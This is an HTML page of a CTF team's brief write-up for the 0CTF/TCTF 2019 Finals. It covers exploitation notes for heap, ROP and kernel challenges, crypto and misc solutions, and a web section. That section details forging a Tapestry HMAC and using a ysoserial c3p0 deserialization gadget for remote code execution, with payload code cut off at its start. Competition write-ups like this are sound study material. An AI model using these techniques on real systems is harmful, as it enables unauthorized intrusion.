@@ -1,0 +1,912 @@
+<!DOCTYPE HTML>
+<!-- This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek). -->
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>0CTF/TCTF 2019 Finals</title>
+    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
+    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
+    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
+    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+  </head>
+  <style>
+  body {
+      padding-top: 56px;
+  }
+
+  .sticky-offset {
+      top: 56px;
+  }
+
+  #body-row {
+      margin-left:0;
+      margin-right:0;
+  }
+  #sidebar-container {
+      min-height: 100vh;   
+      background-color: #333;
+      padding: 0;
+  }
+
+  /* Sidebar sizes when expanded and expanded */
+  .sidebar-expanded {
+      width: 230px;
+  }
+  .sidebar-collapsed {
+      width: 60px;
+  }
+
+  /* Menu item*/
+  #sidebar-container .list-group a {
+      height: 50px;
+      color: white;
+  }
+
+  /* Submenu item*/
+  #sidebar-container .list-group .sidebar-submenu a {
+      height: 45px;
+      padding-left: 60px;
+  }
+  .sidebar-submenu {
+      font-size: 0.9rem;
+  }
+
+  /* Separators */
+  .sidebar-separator-title {
+      background-color: #333;
+      height: 35px;
+  }
+  .sidebar-separator {
+      background-color: #333;
+      height: 25px;
+  }
+  .logo-separator {
+      background-color: #333;    
+      height: 60px;
+  }
+
+
+  /* 
+   active scrollspy
+  */
+  .list-group-item.active {
+    border-color: transparent;
+    border-left: #e69138 solid 4px;
+  }
+
+  /* 
+   anchor padding top
+   https://stackoverflow.com/a/28824157
+  */
+  :target:before {
+    content:"";
+    display:block;
+    height:56px; /* fixed header height*/
+    margin:-56px 0 0; /* negative fixed header height */
+  }
+  </style>
+  
+  <script>
+  // https://stackoverflow.com/a/48330533
+  $(window).on('activate.bs.scrollspy', function (event) {
+    let active_collapse = $($('.list-group-item.active').parents()[0]);
+    $(".collapse").removeClass("show");
+    active_collapse.addClass("show");
+
+    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
+    $('a[href^="#submenu"]').css("border-left", "");
+    parent_menu.css("border-left","#e69138 solid 4px");
+  });
+
+  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      processEscapes: true
+    }
+  });
+  </script>
+
+  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
+    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <a class="navbar-brand" href="https://github.com/balsn/ctf_writeup">
+        <img src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" class="d-inline-block align-top" alt="" width="30" height="30">
+        <span class="menu-collapsed">balsn / ctf_writeup</span>
+      </a>
+      <div class="collapse navbar-collapse" id="navbarNavDropdown">
+        <ul class="navbar-nav my-2 my-lg-0">
+            
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+        
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                pwn
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#babyheap-2.29">babyheap-2.29</a>
+    
+                <a class="dropdown-item" href="#embeded-heap">embeded-heap</a>
+    
+                <a class="dropdown-item" href="#png2a">png2a</a>
+    
+                <a class="dropdown-item" href="#wasabi001">wasabi001</a>
+    
+                <a class="dropdown-item" href="#wasabi002">wasabi002</a>
+    
+                <a class="dropdown-item" href="#fast_furious">fast_furious</a>
+    
+                <a class="dropdown-item" href="#fast_furious2">fast_furious2</a>
+    
+                <a class="dropdown-item" href="#blackhole">blackhole</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                reverse
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#babymath">babymath</a>
+    
+                <a class="dropdown-item" href="#wasabi">wasabi</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                crypto
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#quantum-game">quantum-game</a>
+    
+                <a class="dropdown-item" href="#quantum-measutre">quantum-measutre</a>
+    
+                <a class="dropdown-item" href="#zer0ssh">zer0ssh</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                misc
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#ascii-arts">ascii-arts</a>
+    
+                <a class="dropdown-item" href="#\#\#\#game">\#\#\#game</a>
+    
+                <a class="dropdown-item" href="#insecure-rdp">insecure-rdp</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                web
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#tctf-hotel-booking-system">tctf-hotel-booking-system</a>
+    
+                <a class="dropdown-item" href="#babydb">babydb</a>
+    
+                <a class="dropdown-item" href="#114514-calcalcalc">114514-calcalcalc</a>
+    
+                <a class="dropdown-item" href="#wallbreaker-(not-very)-hard">wallbreaker-(not-very)-hard</a>
+    
+              </div>
+            </li>
+    
+        </ul>
+      </div>
+      <div class="navbar-collapse collapse w-100 order-3 dual-collapse2">
+        <ul class="navbar-nav ml-auto">
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+        </ul>
+      </div>
+    </nav>
+    <div class="row" id="body-row">
+      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
+        <ul class="list-group sticky-top sticky-offset">
+          
+          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">pwn</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu0" class="collapse sidebar-submenu">
+            <a href="#babyheap-2.29" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">babyheap-2.29</span>
+            </a>
+    
+<a href="#embeded-heap" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">embeded-heap</span>
+            </a>
+    
+<a href="#png2a" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">png2a</span>
+            </a>
+    
+<a href="#wasabi001" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">wasabi001</span>
+            </a>
+    
+<a href="#wasabi002" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">wasabi002</span>
+            </a>
+    
+<a href="#fast_furious" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">fast_furious</span>
+            </a>
+    
+<a href="#fast_furious2" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">fast_furious2</span>
+            </a>
+    
+<a href="#blackhole" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">blackhole</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">reverse</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu1" class="collapse sidebar-submenu">
+            <a href="#babymath" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">babymath</span>
+            </a>
+    
+<a href="#wasabi" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">wasabi</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu2" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">crypto</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu2" class="collapse sidebar-submenu">
+            <a href="#quantum-game" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">quantum-game</span>
+            </a>
+    
+<a href="#quantum-measutre" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">quantum-measutre</span>
+            </a>
+    
+<a href="#zer0ssh" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">zer0ssh</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu3" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">misc</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu3" class="collapse sidebar-submenu">
+            <a href="#ascii-arts" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">ascii-arts</span>
+            </a>
+    
+<a href="#\#\#\#game" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">\#\#\#game</span>
+            </a>
+    
+<a href="#insecure-rdp" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">insecure-rdp</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu4" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">web</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu4" class="collapse sidebar-submenu">
+            <a href="#tctf-hotel-booking-system" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">tctf-hotel-booking-system</span>
+            </a>
+    
+<a href="#babydb" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">babydb</span>
+            </a>
+    
+<a href="#114514-calcalcalc" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">114514-calcalcalc</span>
+            </a>
+    
+<a href="#wallbreaker-(not-very)-hard" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">wallbreaker-(not-very)-hard</span>
+            </a>
+    
+          </div>
+    
+        </ul>
+      </div>
+      <div class="col-10 py-3">
+        <article class="markdown-body"><h1 id="0ctf/tctf-2019-finals"><a class="header-link" href="#0ctf/tctf-2019-finals"></a>0CTF/TCTF 2019 Finals</h1>
+<p>We got 2nd place in 0CTF/TCTF 2019 Finals (Shanghai, China). </p>
+<p>As we have lots of final exams at that week, we don&#39;t have much time to finish this writeup in detail. We&#39;ll just write down the post-competition salon notes for most of the challenge.</p>
+
+<h2 id="pwn"><a class="header-link" href="#pwn"></a>Pwn</h2>
+<h3 id="babyheap-2.29"><a class="header-link" href="#babyheap-2.29"></a>BabyHeap 2.29</h3>
+<p>off-by-one null byte
+overlap overwriting tcache</p>
+<h3 id="embeded-heap"><a class="header-link" href="#embeded-heap"></a>Embeded Heap</h3>
+<p>Please refer to dcua&#39;s <a href="https://ctftime.org/writeup/15729">detailed writeup</a>.</p>
+<h3 id="png2a"><a class="header-link" href="#png2a"></a>png2a</h3>
+<p>text chunk heap overflow 0x800000
+png text chunk
+overwrite return address on thread stack</p>
+<h3 id="wasabi001"><a class="header-link" href="#wasabi001"></a>wasabi001</h3>
+<ul class="list">
+<li>compiled with wasi-libc</li>
+<li>Heap overflow in &quot;edit option&quot;</li>
+<li>dlmalloc, heap no aslr in wasm but wasabi has one weak aslr mitigation at beginning</li>
+<li>chunk overlap to control &quot;content&quot; ptr</li>
+<li>Arbitrary read and write</li>
+</ul>
+<h4 id="solution1:"><a class="header-link" href="#solution1:"></a>Solution1:</h4>
+<ul class="list">
+<li>Arbitratry read to leak xored flag on server</li>
+<li>extract xor key from binary</li>
+<li>xor and get it</li>
+</ul>
+<h4 id="solution2-(intended):"><a class="header-link" href="#solution2-(intended):"></a>Solution2 (intended):</h4>
+<ul class="list">
+<li>Arbitrary write to overwirte handcoded SHA512 value at memcmp<ul class="list">
+<li>key point: no rodata in wasm memory</li>
+<li>&quot;Get Flag&quot; will print flag of wasabi001 and go to wasabi002</li>
+</ul>
+</li>
+</ul>
+<h3 id="wasabi002"><a class="header-link" href="#wasabi002"></a>wasabi002</h3>
+<ul class="list">
+<li>precondition<ul class="list">
+<li>Bypass SHA512 in &quot;Get Flag&quot; option first   </li>
+</ul>
+</li>
+<li>Target:<ul class="list">
+<li>read server flag file</li>
+</ul>
+</li>
+<li>Simple vm main at func[18]</li>
+<li>Fixed vm instructions in binary<ul class="list">
+<li>function: print &quot;Amazing,gogogo&quot;</li>
+</ul>
+</li>
+<li>Fixed vm instructions in code<ul class="list">
+<li>operands is fixed<ul class="list">
+<li>with &quot;i32 func(i32,i32,i32)&quot; function signature</li>
+<li>opcode is fixed<ul class="list">
+<li>opcode =&gt; Handler =&gt; vtable</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>VM handlers<ul class="list">
+<li>provide basic vm instruction for open,read,write</li>
+</ul>
+</li>
+</ul>
+<h4 id="solution:"><a class="header-link" href="#solution:"></a>Solution:</h4>
+<ul class="list">
+<li>Overwrite vm vtable<ul class="list">
+<li>make a semantic confusion on vm handlers</li>
+<li>one of usable solution</li>
+</ul>
+</li>
+<li>note <ul class="list">
+<li>follow the wasm Coarse-Grained CFI Rules on indirect call =&gt; Same function prototype</li>
+<li>function pointer =&gt; Element index in wasm Ele Segment</li>
+</ul>
+</li>
+<li>Overwrite vm context<ul class="list">
+<li>vm regs and memory ( also on wasm linear memory)</li>
+</ul>
+</li>
+<li>&quot;Get flag&quot; option to get flag</li>
+</ul>
+<p>WASM and WASI my be a new promising area in future
+AFAK no good and matured IDA processor for now</p>
+<ul class="list">
+<li>Harvard Architecture<ul class="list">
+<li>no stkof but still have some security problems</li>
+<li>hard to hijack the control flow<h3 id="fast_furious"><a class="header-link" href="#fast_furious"></a>Fast_Furious</h3>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="unintended-solution"><a class="header-link" href="#unintended-solution"></a>unintended solution</h4>
+<ol class="list">
+<li>edit io_buf to make copy_from_user fail to get UAF</li>
+<li>Heap sparying objects that include some function pointers</li>
+<li>Overwrite function pointer to control pc<h3 id="fast_furious2"><a class="header-link" href="#fast_furious2"></a>Fast_Furious2</h3>
+</li>
+<li>Race with mmap and munmap to get out-of-bounds to leak kernel address. The idea comes from  CVE-2015-1805.</li>
+<li>Use CVE-2019-9213 to mmap virtual address 0 and place gadgets.</li>
+<li>3 Control pc by NULL pointer dereference.</li>
+</ol>
+<h3 id="blackhole"><a class="header-link" href="#blackhole"></a>blackhole</h3>
+<h4 id="solution1:-1"><a class="header-link" href="#solution1:-1"></a>Solution1:</h4>
+<ul class="list">
+<li>pivot to bss</li>
+<li>calling my_read</li>
+<li>leave a return address(0x832) on .bss section</li>
+<li>partial overwrite the reutnr address , make it point to <code>mov rsi, rcx</code> (0x828)</li>
+<li>chain it after a read call, rcx(which is address just after syscall) will be moved into rsi.</li>
+<li>kthen try to store rsi back to.bss</li>
+<li>partial overwrite it again, you have a syscall address<h4 id="solution2:"><a class="header-link" href="#solution2:"></a>Solution2:</h4>
+</li>
+<li>try to move __libc_start_main into rbx</li>
+<li>Utilize add ebx, esi, get target 4 bytes of address</li>
+<li>put it on .bss</li>
+<li>And then repeat to put the other 4 bytes</li>
+</ul>
+<h4 id="my-solution"><a class="header-link" href="#my-solution"></a>my solution</h4>
+<p>Copy got of __libc_start_main</p>
+<ol class="list">
+<li>Construct rop at the start of data section (just after read only gots)</li>
+<li>goto (pop rsp,pop r13, pop r14, pop r15,ret),set rsp to got of __libc_start_main</li>
+<li>then we have __libc_start_main in r13</li>
+<li>Pivot and then call any function pushing r13(__libc_csu_init),after it returns we have a pointer to libc_start_main(in data section)</li>
+<li>call arbitrary function pointer in libc.<ul class="list">
+<li>Say we already copied got entry to address A</li>
+<li>we can construct a new rop chain newrby and pivot to it</li>
+<li>setting r12==&amp;libc_start_main,r8== ???
+find a good function pionter.</li>
+</ul>
+</li>
+<li>I choose_IO_str_seekoff</li>
+<li>fp-&gt;_IO_read_ptr=fp-&gt;_IO_read_base+base;</li>
+<li>Copy_libc_start_main to address B</li>
+<li><h2 id="reverse"><a class="header-link" href="#reverse"></a>Reverse</h2>
+<h3 id="babymath"><a class="header-link" href="#babymath"></a>BabyMath</h3>
+</li>
+</ol>
+<p>author is github.com/septyem</p>
+<p>Given $f(n)$ you are suppose to recover n (~$2^{56}$)</p>
+<p>$$
+\begin{bmatrix}
+  f(n-2) \
+  f(n-1) \
+  f(n)
+\end{bmatrix} =
+\begin{bmatrix} 
+  0 &amp; 1 &amp; 0 \
+  0 &amp; 0 &amp; 1 \
+  1 &amp; 1 &amp; 1
+\end{bmatrix}
+\begin{bmatrix}
+  f(n-3) \
+  f(n-2) \
+  f(n-1)
+\end{bmatrix}
+$$</p>
+<p>Reduce to discrete logarithm of matrix
+Baby-step giant-step
+Done!</p>
+<h3 id="wasabi"><a class="header-link" href="#wasabi"></a>wasabi</h3>
+<p>A simple compression algorithm</p>
+<ul class="list">
+<li>Burrows-wheeler Transform<ul class="list">
+<li>note: Insert 0x19 at beginning and 0x20 at the end of original input</li>
+</ul>
+</li>
+<li>second stage: run-length encoding</li>
+</ul>
+<p>How to reverse it</p>
+<ul class="list">
+<li>Rich way<ul class="list">
+<li>Buy JEB 3.0+   </li>
+</ul>
+</li>
+<li>Poor way<ul class="list">
+<li>wasm2c -&gt; recompile .c with O3 optimization -&gt; Hex-ray</li>
+<li>find a gdb-like debugger (dynamic) -&gt; 404 for me</li>
+<li>debug runtime jit code<ul class="list">
+<li>what runtime do ?<ul class="list">
+<li>lift wasm and jit to x64</li>
+</ul>
+</li>
+<li>choose a runtime<ul class="list">
+<li>wasmtime, wasmer, lucet</li>
+<li>example:<ul class="list">
+<li>my customization on wasmtime for debuggin with gdb </li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="crypto"><a class="header-link" href="#crypto"></a>Crypto</h2>
+<h3 id="quantum-game"><a class="header-link" href="#quantum-game"></a>Quantum Game</h3>
+<p>target: make the qubit measured to be 1 finally no matter flip it or not</p>
+<p>method: superposition of half 0 and half 1 (google it and find answer at pyquil doc)</p>
+<p>Solution: </p>
+<ul class="list">
+<li>first move X0+H0</li>
+<li>second move H0</li>
+</ul>
+<p>target:make the qubit measured to be 0 finally when you can make only one move</p>
+<p>methid: rotate the phase by 180 degrees</p>
+<p>solution: </p>
+<ul class="list">
+<li>RY(pi) 0 or RZ(pi) 0</li>
+</ul>
+<h3 id="quantum-measutre"><a class="header-link" href="#quantum-measutre"></a>Quantum Measutre</h3>
+<p>Design</p>
+<ul class="list">
+<li>32-bit-long flag are encoded in to 8 qubits</li>
+<li>these qubits are processed bu the program</li>
+<li>sample 3200000 and the result is provided</li>
+<li>BTW, i want to make the lag 64-bit-long but I can&#39;t solve the large inequations. If you know it send the mail to 0ops</li>
+</ul>
+<p>Solution</p>
+<ul class="list">
+<li>brute force search</li>
+<li>initial probability of 8 qubits measured to be 1 are 8 variables (x0-x7)</li>
+<li>enumerate all possible flags, calculate the prob and compare them with the frequency in the result (subtract square and sum up)</li>
+<li>you can transform the float to int to solve the chal more efficiently</li>
+</ul>
+<h3 id="zer0ssh"><a class="header-link" href="#zer0ssh"></a>zer0ssh</h3>
+<p>author is github.com/septyem</p>
+<ul class="list">
+<li>redirect a session of ssh client to your ip, mitm for ssh</li>
+<li>fool the server instead of the client</li>
+<li><a href="https://security.stackexchange.com/a/77187">session_identifier</a> cannot determined by any single patch (part?)</li>
+</ul>
+<p>id_xmss(<a href="https://tools.ietf.org/html/rfc8391">XMSS</a>: ) use WOTS+ , and the client is in a docker image.
+(OTS: one-time signature)</p>
+<p>hash-based signature</p>
+<p>$sig1 = h^7(sk1)$
+$sig2 = h^2(sk2)$</p>
+<p>If you have sig for 0x0, you can also sign any other message for this part
+Just collect enough signature and win!
+<a href="https://github.com/septyem">will release my solution at github laterc</a></p>
+<h2 id="misc"><a class="header-link" href="#misc"></a>Misc</h2>
+<h3 id="ascii-arts"><a class="header-link" href="#ascii-arts"></a>ASCII Arts</h3>
+<p>turing complete
+Doc: ajanse.me/asciidots
+Interpreter: github.com/aaronjanse/asciidots</p>
+<p>The program on the T-shirt can be split in 5 parts</p>
+<ol class="list">
+<li>header: define warps</li>
+<li>T: clock generatur</li>
+<li>C: counter $2^{64}$</li>
+<li>T: decode and output</li>
+<li>F: encodede flag</li>
+</ol>
+<p>or you can just modify the conunter value from $2^{64}$ to 1 and the program will print the flag for you</p>
+<p>One of the team <code>U+1F914</code> solved this in 28 seconds.</p>
+<h3 id="\#\#\#game"><a class="header-link" href="#\#\#\#game"></a>###game</h3>
+<ol class="list">
+<li>AI algo is not very strong</li>
+<li><p>AI is not random, win one then win five</p>
+</li>
+<li><p>No bruteforce, more creative computer implementations are necessary</p>
+</li>
+<li>Minimax or Monte carlo tree</li>
+</ol>
+<p>Intended sol: Directly play with AI, win then replay five times</p>
+<h3 id="insecure-rdp"><a class="header-link" href="#insecure-rdp"></a>Insecure RDP</h3>
+<ol class="list">
+<li>Read the doc, find the priv key, use RDP-Replay</li>
+<li>Factor RSA public key, but not the intended way,</li>
+</ol>
+<p>decode as TPKT in wireshark
+according to <a href="https://docs.microsoft.com/en-us/windows/desktop/api/wincrypt/ns-wincrypt-_rsapubkey">MS doc</a></p>
+<p>RSA1: public key
+RSA2: private key</p>
+<p>decrypt client random, calculate pre-master secret, decode data: fast-path keyboard event</p>
+<h4 id="postscript"><a class="header-link" href="#postscript"></a>Postscript</h4>
+<p>Rumor has it that the one of the team uses the supercomputer <a href="https://en.wikipedia.org/wiki/Tianhe-1">天河一號</a> to factor the RSA-512. Our experiment shows that using <a href="http://cado-nfs.gforge.inria.fr/">CADO-NFS</a> to factor RSA-512 on a single computer with 24 cores (clock rate: 2.00 GHz) takes about 140 days. Thus, in order to factor RSA-512 in a day, we have to deploy it to at least 140 computers.</p>
+<p>Actually, if we solve this challenge, we will win the first place :P</p>
+<h2 id="web"><a class="header-link" href="#web"></a>Web</h2>
+<h3 id="tctf-hotel-booking-system"><a class="header-link" href="#tctf-hotel-booking-system"></a>TCTF Hotel Booking System</h3>
+<p>The challenge uses java-based Apache Tapestry 5 framework. The author seems to modify a <a href="https://tapestry-app.apache.org/hotels/">example hotel booking application</a>. We found the source code of the example on <a href="github">https://github.com/ccordenier/tapestry5-hotel-booking/tree/master/src/main</a>.</p>
+<p>In the HTML comment, there is a hint indicating that we can use <code>c3p0</code> as possbile Java deserialization gadget.</p>
+<p>By fuzzing a while, we found a few useful feature like listing a directory.</p>
+<pre class="hljs"><code>curl <span class="hljs-string">'http://192.168.201.15/assets/ctx/96a038cf/static/'</span> -sD -
+
+<span class="hljs-number">1</span>-<span class="hljs-keyword">star</span>.gif
+<span class="hljs-number">2</span>-<span class="hljs-keyword">star</span>.gif
+<span class="hljs-number">3</span>-<span class="hljs-keyword">star</span>.gif
+<span class="hljs-number">4</span>-<span class="hljs-keyword">star</span>.gif
+<span class="hljs-number">5</span>-<span class="hljs-keyword">star</span>.gif
+ajax-loader.gif
+bg.png
+hotel-booking.js
+reset.css
+scenery
+style.css
+tapestry_s.png
+tapestry.png
+top-bg.png</code></pre><p>However, it can only be used to access static files. We want to access either <code>WEB.XML</code> or classes. According to <a href="http://tapestry.apache.org/assets.html">official document</a>, we can access assets by specifying the classpath. There is also <a href="https://git-wip-us.apache.org/repos/asf?p=tapestry-5.git;a=blob;f=tapestry-core/src/test/app1/AssetProtectionDemo.tml;h=e21bc61734a5d3fab468b1ba4ad2c36893ae8430;hb=d2d9247#l20">an example</a>. Unfortunately it blocks access to <code>META-INF</code>, but at lease we can still access class file:</p>
+<pre class="hljs"><code><span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/35.201.228.198:64648/assets</span><span class="hljs-regexp">/app/</span><span class="hljs-number">2</span>c6a8ea9/services/Authenticator.<span class="hljs-keyword">class</span>
+<span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/35.201.228.198:64648/assets</span><span class="hljs-regexp">/app/e</span>3d6c19d/services/AppModule.<span class="hljs-keyword">class</span>
+<span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/35.201.228.198:64648/</span><span class="hljs-regexp">/assets/app</span><span class="hljs-regexp">/9e302bae/pages</span><span class="hljs-regexp">/Index.class</span></code></pre><p>The 4-byte hash is not impportant. When specifying the incorrect hash, the server will redirect to a correct path with correct hash value.</p>
+<p>Decompiling the <code>AppModule.class</code> we found an interesting variable. It&#39;s used to sign the HMAC string of serialized object data, according to the <a href="http://tapestry.apache.org/configuration.html">document</a>.</p>
+<pre class="hljs"><code>configuration.<span class="hljs-keyword">add</span>(<span class="hljs-string">"tapestry.hmac-passphrase"</span>, <span class="hljs-string">"TOP_SECRET_PASSPHRASE_YOU_WILL_NEVER_KNOW:)"</span>);</code></pre><p>Alright, the next is to find how to leverage this key. When sending a search query to the server, the server will validate the user-provided json serialized object&#39;s HMAC and then deserialize it. </p>
+<p>To forge a HMAC signature, I follow the procedure of <a href="https://github.com/apache/tapestry-5/blob/85cc611fbad4a3574664b33ce9adf614b4f0fe07/tapestry-core/src/main/java/org/apache/tapestry5/internal/services/ClientDataEncoderImpl.java#L82-L117">the source code</a> but my payload still fails to pass the validation. I have no idea and get stuck for a few hours. I&#39;m not sure if it&#39;s because of the <a href="https://github.com/apache/tapestry-5/blob/85cc611fbad4a3574664b33ce9adf614b4f0fe07/tapestry-core/src/main/java/org/apache/tapestry5/services/URLEncoder.java">weird urldecoder</a>.</p>
+<p>Therefore I install the Tapestry locally and forge a HMAC. Note that the server will first read a few bytes and than deserialize the rest of data. Please refer to <a href="https://github.com/apache/tapestry-5/blob/85cc611fbad4a3574664b33ce9adf614b4f0fe07/tapestry-core/src/main/java/org/apache/tapestry5/corelib/components/Form.java#L719-L738">the source code</a>. Using <a href="https://github.com/frohoff/ysoserial">ysoserial</a>&#39;s cp0 payload to get RCE.</p>
+<p>Here is my final payload.</p>
+<pre class="hljs"><code><span class="hljs-keyword">import</span> com.mchange.v2.c3p0.PoolBackedDataSource;
+<span class="hljs-keyword">import</span> org.apache.tapestry5.internal.services.ClientDataEncoderImpl;
+<span class="hljs-keyword">import</span> org.apache.tapestry5.services.ClientDataEncoder;
+<span class="hljs-keyword">import</span> org.apache.tapestry5.services.ClientDataSink;
+
+<span class="hljs-keyword">import</span> java.io.*;
+
+<span class="hljs-keyword">import</span> java.sql.SQLException;
+<span class="hljs-keyword">import</span> java.sql.SQLFeatureNotSupportedException;
+<span class="hljs-keyword">import</span> java.util.logging.Logger;
+
+<span class="hljs-keyword">import</span> javax.naming.NamingException;
+<span class="hljs-keyword">import</span> javax.naming.Reference;
+<span class="hljs-keyword">import</span> javax.naming.Referenceable;
+<span class="hljs-keyword">import</span> javax.sql.ConnectionPoolDataSource;
+<span class="hljs-keyword">import</span> javax.sql.PooledConnection;
+
+<span class="hljs-keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
+
+<span class="hljs-keyword">import</span> ysoserial.payloads.util.Reflections;
+
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>{
